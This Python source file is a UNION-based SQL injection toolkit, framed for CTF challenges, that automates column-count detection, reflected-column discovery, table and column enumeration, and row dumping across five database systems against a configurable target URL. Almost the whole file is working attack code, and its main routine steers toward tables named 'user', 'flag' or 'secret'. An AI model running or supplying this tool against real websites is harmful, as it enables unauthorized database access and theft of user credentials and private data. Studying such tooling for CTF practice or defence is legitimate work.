#!/usr/bin/env python3
"""
Manual UNION-based SQL injection toolkit.

PURPOSE
-------
Automate UNION-based SQL injection for CTF web challenges:

  1.  Detect the number of columns in the SELECT statement.
  2.  Find which column(s) accept string output.
  3.  Extract database metadata (tables, columns).
  4.  Dump table data.

USAGE
-----
    python3 sqli_union.py

Adjust the TARGET_URL, PARAM, and optional HEADERS / COOKIES below, then
call the functions as needed in ``main()``.

REQUIREMENTS
------------
    pip install httpx

SUPPORTED DBMS
--------------
  mysql       — MySQL / MariaDB
  mssql       — Microsoft SQL Server
  oracle      — Oracle (uses DUAL, ROWNUM)
  sqlite      — SQLite
  postgres    — PostgreSQL

AUTHOR: Sentinel CTF Framework
"""

from __future__ import annotations

import time
import sys
from typing import Optional

try:
    import httpx  # type: ignore
except ImportError:
    print("[!] httpx not installed. Run: pip install httpx", file=sys.stderr)
    sys.exit(1)


# =============================================================================
# CONFIG
# =============================================================================

TARGET_URL    = "http://target.example.com/page.php"
PARAM         = "id"                          # Vulnerable GET parameter
DBMS          = "mysql"                       # See SUPPORTED DBMS above
DELAY         = 0.3                           # Seconds between requests
TIMEOUT       = 10                            # HTTP request timeout
SENTINEL      = "SENTINEL_MARKER_8675309"     # Unique marker for detection

# Optional — set if the endpoint needs authentication headers / cookies.
HEADERS: dict[str, str] = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Sentinel-CTF/1.0",
    # "Cookie": "session=abc123",
}
COOKIES: dict[str, str] = {}

# =============================================================================


# ---------------------------------------------------------------------------
# HTTP helper
# ---------------------------------------------------------------------------

_client: Optional[httpx.Client] = None


def get_client() -> httpx.Client:
    """Return a cached ``httpx.Client`` with configured headers."""
    global _client
    if _client is None:
        _client = httpx.Client(
            headers=HEADERS,
            cookies=COOKIES,
            timeout=TIMEOUT,
            follow_redirects=True,
        )
    return _client


def http_get(url: str, params: dict) -> str:
    """
    Perform a GET request and return the response body as a string.

    Parameters
    ----------
    url:
        Target URL.
    params:
        Query parameters dict (values will be URL-encoded by httpx).

    Returns
    -------
    str
        Response body text.
    """
    time.sleep(DELAY)
    resp = get_client().get(url, params=params)
    return resp.text


def inject(payload: str) -> str:
    """
    Inject *payload* as the value of the vulnerable parameter.

    Parameters
    ----------
    payload:
        SQL injection payload string (not URL-encoded yet).

    Returns
    -------
    str
        Response body text.
    """
    return http_get(TARGET_URL, {PARAM: payload})


# ---------------------------------------------------------------------------
# DBMS-specific query fragments
# ---------------------------------------------------------------------------

# Dual table for FROM clause (Oracle needs FROM dual; others can omit)
_FROM_DUAL: dict[str, str] = {
    "mysql":    "",
    "mssql":    "",
    "sqlite":   "",
    "postgres": "",
    "oracle":   " FROM DUAL",
}

# Information_schema table names
_TABLES_QUERY: dict[str, str] = {
    "mysql":    "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
    "mssql":    "SELECT name FROM sys.tables",
    "sqlite":   "SELECT name FROM sqlite_master WHERE type='table'",
    "postgres": "SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname='public'",
    "oracle":   "SELECT table_name FROM all_tables",
}

_COLUMNS_QUERY: dict[str, str] = {
    "mysql":    "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
    "mssql":    "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
    "sqlite":   "SELECT name FROM pragma_table_info('{table}')",
    "postgres": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
    "oracle":   "SELECT column_name FROM all_tab_columns WHERE table_name=UPPER('{table}')",
}

# Concat separator for multi-row UNION tricks (GROUP_CONCAT / string_agg)
_GROUP_CONCAT: dict[str, str] = {
    "mysql":    "GROUP_CONCAT({col} SEPARATOR 0x7c7c)",   # ||
    "mssql":    "STRING_AGG({col}, '||')",
    "sqlite":   "GROUP_CONCAT({col}, '||')",
    "postgres": "STRING_AGG({col}::text, '||')",
    "oracle":   "LISTAGG({col}, '||') WITHIN GROUP (ORDER BY ROWNUM)",
}


def _null_list(n: int) -> str:
    """Return ``NULL,NULL,...`` with *n* elements."""
    return ",".join(["NULL"] * n)


# ---------------------------------------------------------------------------
# 1. detect_columns
# ---------------------------------------------------------------------------

def detect_columns(
    url: str = TARGET_URL,
    param: str = PARAM,
    max_cols: int = 20,
) -> Optional[int]:
    """
    Detect the number of columns in the vulnerable SELECT statement.

    Uses an ``ORDER BY`` clause incrementally.  When the column index
    exceeds the actual column count, the server returns an error or a
    noticeably different response.

    Parameters
    ----------
    url:
        Target URL.
    param:
        Vulnerable parameter name.
    max_cols:
        Maximum number of columns to attempt.

    Returns
    -------
    int or None
        Detected column count, or ``None`` if detection failed.
    """
    print(f"[*] Detecting column count via ORDER BY (max {max_cols}) ...")
    baseline_ok = inject("1 ORDER BY 1 --")

    for n in range(1, max_cols + 1):
        payload  = f"1 ORDER BY {n} --"
        response = http_get(url, {param: payload})
        # Heuristic: a longer / different response often signals an error.
        # Adjust the error keywords to match your target's error messages.
        error_keywords = [
            "error", "syntax", "unknown column", "ORA-", "SQLSTATE",
        ]
        has_error = any(kw.lower() in response.lower() for kw in error_keywords)
        if has_error:
            col_count = n - 1
            print(f"[+] Column count: {col_count}")
            return col_count

    print(f"[!] Could not detect column count within {max_cols}. Try raising max_cols.")
    return None


# ---------------------------------------------------------------------------
# 2. find_string_column
# ---------------------------------------------------------------------------

def find_string_column(
    url: str = TARGET_URL,
    param: str = PARAM,
    num_cols: int = 1,
) -> Optional[int]:
    """
    Find which UNION column outputs string data.

    Injects ``UNION SELECT NULL,...,'SENTINEL',...,NULL`` replacing one NULL
    at a time with the sentinel string.

    Parameters
    ----------
    url:
        Target URL.
    param:
        Vulnerable parameter name.
    num_cols:
        Total column count (from :func:`detect_columns`).

    Returns
    -------
    int or None
        0-based index of the first string-capable column, or ``None``.
    """
    print(f"[*] Finding string column in {num_cols}-column result set ...")
    for idx in range(num_cols):
        parts   = ["NULL"] * num_cols
        parts[idx] = f"'{SENTINEL}'"
        union   = ",".join(parts)
        from_clause = _FROM_DUAL.get(DBMS, "")
        payload = f"0 UNION SELECT {union}{from_clause} --"
        response = http_get(url, {param: payload})
        if SENTINEL in response:
            print(f"[+] String column index: {idx} (1-based: {idx + 1})")
            return idx

    print("[!] No string column found. The result set may not be reflected.")
    return None


# ---------------------------------------------------------------------------
# 3. extract_data
# ---------------------------------------------------------------------------

def extract_data(
    url: str,
    param: str,
    num_cols: int,
    str_col: int,
    query: str,
) -> str:
    """
    Execute an arbitrary *query* via UNION injection and return the result.

    The *query* should be a single-column SQL expression (e.g.
    ``database()`` or ``user()``).  For multi-row results use the DBMS
    concat function.

    Parameters
    ----------
    url:
        Target URL.
    param:
        Vulnerable parameter name.
    num_cols:
        Total column count.
    str_col:
        0-based index of the string-capable column.
    query:
        SQL expression to inject (single value, no surrounding quotes).

    Returns
    -------
    str
        Extracted value, or an empty string if not found in response.
    """
    parts   = ["NULL"] * num_cols
    parts[str_col] = query
    union   = ",".join(parts)
    from_clause = _FROM_DUAL.get(DBMS, "")
    payload = f"0 UNION SELECT {union}{from_clause} --"
    response = http_get(url, {param: payload})
    # Try to extract between marker boundaries if present
    # Otherwise return the full response for manual inspection.
    return response


# ---------------------------------------------------------------------------
# 4. get_tables
# ---------------------------------------------------------------------------

def get_tables(
    url: str = TARGET_URL,
    param: str = PARAM,
    num_cols: int = 1,
    str_col: int = 0,
    dbms: str = DBMS,
) -> list[str]:
    """
    Extract all table names from the database.

    Parameters
    ----------
    url, param, num_cols, str_col:
        Same as :func:`extract_data`.
    dbms:
        DBMS type string (``'mysql'``, ``'sqlite'``, etc.).

    Returns
    -------
    list[str]
        List of table names.
    """
    print(f"[*] Extracting tables ({dbms}) ...")
    inner_q = _TABLES_QUERY.get(dbms)
    if not inner_q:
        raise ValueError(f"Unsupported DBMS: {dbms!r}")

    # Wrap with GROUP_CONCAT / STRING_AGG for single-row output
    gc_tmpl = _GROUP_CONCAT.get(dbms, "GROUP_CONCAT({col})")
    sub     = f"({inner_q})"
    concat  = gc_tmpl.format(col="t.tbl_name" if dbms == "sqlite" else "t.table_name") \
              if dbms not in ("sqlite",) else \
              gc_tmpl.format(col="name")

    # Simpler approach: use a subquery alias
    parts   = ["NULL"] * num_cols
    parts[str_col] = f"({inner_q} LIMIT 1)"   # LIMIT for safety; iterate below
    # --- Full dump via concatenation ---
    if dbms == "mysql":
        full_query = f"(SELECT GROUP_CONCAT(table_name SEPARATOR '||') FROM information_schema.tables WHERE table_schema=database())"
    elif dbms == "sqlite":
        full_query = "(SELECT GROUP_CONCAT(name,'||') FROM sqlite_master WHERE type='table')"
    elif dbms == "postgres":
        full_query = "(SELECT STRING_AGG(tablename,'||') FROM pg_catalog.pg_tables WHERE schemaname='public')"
    elif dbms == "mssql":
        full_query = "(SELECT STRING_AGG(name,'||') FROM sys.tables)"
    elif dbms == "oracle":
        full_query = "(SELECT LISTAGG(table_name,'||') WITHIN GROUP (ORDER BY table_name) FROM all_tables)"
    else:
        full_query = f"({inner_q} LIMIT 1)"

    parts[str_col] = full_query
    union    = ",".join(parts)
    from_clause = _FROM_DUAL.get(dbms, "")
    payload  = f"0 UNION SELECT {union}{from_clause} --"
    response = http_get(url, {param: payload})

    # Parse table names from response (heuristic: look for '||' separated list)
    tables: list[str] = []
    for line in response.splitlines():
        if "||" in line:
            # Extract and split
            start = line.find("||")
            # Walk backwards to find the start of the value
            segment = line.strip()
            tables = [t.strip() for t in segment.split("||") if t.strip()]
            break

    if tables:
        print(f"[+] Tables ({len(tables)}): {', '.join(tables)}")
    else:
        print("[!] Could not parse table names. Raw response snippet:")
        print(response[:500])

    return tables


# ---------------------------------------------------------------------------
# 5. get_columns
# ---------------------------------------------------------------------------

def get_columns(
    url: str = TARGET_URL,
    param: str = PARAM,
    num_cols: int = 1,
    str_col: int = 0,
    table: str = "",
    dbms: str = DBMS,
) -> list[str]:
    """
    Extract column names for a given *table*.

    Parameters
    ----------
    url, param, num_cols, str_col:
        Same as :func:`extract_data`.
    table:
        Name of the target table.
    dbms:
        DBMS type string.

    Returns
    -------
    list[str]
        List of column names.
    """
    print(f"[*] Extracting columns of table '{table}' ({dbms}) ...")
    base_q = _COLUMNS_QUERY.get(dbms, "").format(table=table)
    if not base_q:
        raise ValueError(f"Unsupported DBMS: {dbms!r}")

    if dbms == "mysql":
        full_query = f"(SELECT GROUP_CONCAT(column_name SEPARATOR '||') FROM information_schema.columns WHERE table_name='{table}')"
    elif dbms == "sqlite":
        full_query = f"(SELECT GROUP_CONCAT(name,'||') FROM pragma_table_info('{table}'))"
    elif dbms == "postgres":
        full_query = f"(SELECT STRING_AGG(column_name,'||') FROM information_schema.columns WHERE table_name='{table}')"
    elif dbms == "mssql":
        full_query = f"(SELECT STRING_AGG(column_name,'||') FROM information_schema.columns WHERE table_name='{table}')"
    elif dbms == "oracle":
        full_query = f"(SELECT LISTAGG(column_name,'||') WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE table_name=UPPER('{table}'))"
    else:
        full_query = f"({base_q} LIMIT 1)"

    parts    = ["NULL"] * num_cols
    parts[str_col] = full_query
    union    = ",".join(parts)
    from_clause = _FROM_DUAL.get(dbms, "")
    payload  = f"0 UNION SELECT {union}{from_clause} --"
    response = http_get(url, {param: payload})

    columns: list[str] = []
    for line in response.splitlines():
        if "||" in line:
            columns = [c.strip() for c in line.strip().split("||") if c.strip()]
            break

    if columns:
        print(f"[+] Columns of '{table}' ({len(columns)}): {', '.join(columns)}")
    else:
        print("[!] Could not parse columns. Raw response snippet:")
        print(response[:500])

    return columns


# ---------------------------------------------------------------------------
# 6. dump_table
# ---------------------------------------------------------------------------

def dump_table(
    url: str = TARGET_URL,
    param: str = PARAM,
    num_cols: int = 1,
    str_col: int = 0,
    table: str = "",
    columns: list[str] = None,  # type: ignore[assignment]
    dbms: str = DBMS,
    row_limit: int = 100,
) -> list[dict[str, str]]:
    """
    Dump all rows from *table* for the specified *columns*.

    Each row is retrieved by iterating OFFSET values for databases that
    support ``LIMIT … OFFSET …``.  For Oracle, ``ROWNUM`` is used.

    Parameters
    ----------
    url, param, num_cols, str_col:
        Same as :func:`extract_data`.
    table:
        Target table name.
    columns:
        List of column names to retrieve.
    dbms:
        DBMS type string.
    row_limit:
        Maximum number of rows to fetch.

    Returns
    -------
    list[dict[str, str]]
        List of dicts mapping column name → value.
    """
    if columns is None or not columns:
        raise ValueError("Specify at least one column to dump.")

    print(f"[*] Dumping table '{table}' columns {columns} ...")
    col_expr = " || '::' || ".join(columns)  # Combine columns in one shot
    rows: list[dict[str, str]] = []

    for offset in range(row_limit):
        if dbms in ("mysql", "sqlite", "postgres"):
            full_query = f"(SELECT {col_expr} FROM {table} LIMIT 1 OFFSET {offset})"
        elif dbms == "mssql":
            col_concat = " + '::' + ".join([f"CAST({c} AS NVARCHAR(MAX))" for c in columns])
            full_query = (
                f"(SELECT {col_concat} FROM (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) "
                f"AS rn, {col_concat} AS v FROM {table}) t WHERE rn={offset + 1})"
            )
        elif dbms == "oracle":
            col_concat = " || '::' || ".join(columns)
            full_query = (
                f"(SELECT {col_concat} FROM {table} "
                f"WHERE ROWNUM=1 AND {table}.ROWID > "
                f"(SELECT NVL(MAX(ROWID),'AAAAAAAAAAAAAAAAAAa') FROM {table} "
                f"WHERE ROWNUM<={offset}))"
            )
        else:
            full_query = f"(SELECT {col_expr} FROM {table} LIMIT 1 OFFSET {offset})"

        parts = ["NULL"] * num_cols
        parts[str_col] = full_query
        union  = ",".join(parts)
        from_clause = _FROM_DUAL.get(dbms, "")
        payload = f"0 UNION SELECT {union}{from_clause} --"
        response = http_get(url, {param: payload})

        # Extract row value from response
        row_val = _extract_value_from_response(response)
        if not row_val:
            print(f"[*] No more rows at offset {offset}.")
            break

        vals = row_val.split("::")
        row  = {col: (vals[i] if i < len(vals) else "") for i, col in enumerate(columns)}
        rows.append(row)
        print(f"  [{offset}] {row}")

    print(f"[+] Dumped {len(rows)} row(s) from '{table}'.")
    return rows


def _extract_value_from_response(response: str) -> str:
    """
    Heuristic: try to extract a reflected value from *response*.

    Looks for content between ``<td>`` tags, common in tabular output.
    Customise this for your target's HTML structure.

    Parameters
    ----------
    response:
        Full HTTP response body text.

    Returns
    -------
    str
        Extracted value, or empty string if nothing found.
    """
    import re
    # Try <td>...</td> first
    m = re.search(r"<td[^>]*>(.*?)</td>", response, re.IGNORECASE | re.DOTALL)
    if m:
        return m.group(1).strip()
    # Try <p>...</p>
    m = re.search(r"<p[^>]*>(.*?)</p>", response, re.IGNORECASE | re.DOTALL)
    if m:
        return m.group(1).strip()
    # Fallback: look for bare value preceded by newline
    for line in response.splitlines():
        line = line.strip()
        if line and len(line) < 200 and "::" in line:
            return line
    return ""


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    """
    End-to-end UNION injection demonstration.

    Adjust the calls below to fit your target.
    """
    print(f"[*] Target: {TARGET_URL} (param={PARAM}, dbms={DBMS})")

    # Step 1: detect column count
    num_cols = detect_columns()
    if num_cols is None:
        print("[!] Aborting — column count unknown.")
        return

    # Step 2: find string column
    str_col = find_string_column(num_cols=num_cols)
    if str_col is None:
        print("[!] Aborting — no string column found.")
        return

    # Step 3: get tables
    tables = get_tables(num_cols=num_cols, str_col=str_col)

    if not tables:
        print("[!] No tables found — check DBMS setting or injection syntax.")
        return

    # Step 4: pick an interesting table (e.g. 'users', 'flag')
    target_table = tables[0]
    for t in tables:
        if "flag" in t.lower() or "user" in t.lower() or "secret" in t.lower():
            target_table = t
            break
    print(f"[*] Targeting table: {target_table}")

    # Step 5: get columns
    cols = get_columns(num_cols=num_cols, str_col=str_col, table=target_table)
    if not cols:
        return

    # Step 6: dump data
    rows = dump_table(
        num_cols=num_cols,
        str_col=str_col,
        table=target_table,
        columns=cols,
    )

    print("\n[+] Dump complete.")
    for row in rows:
        print(row)


if __name__ == "__main__":
    main()
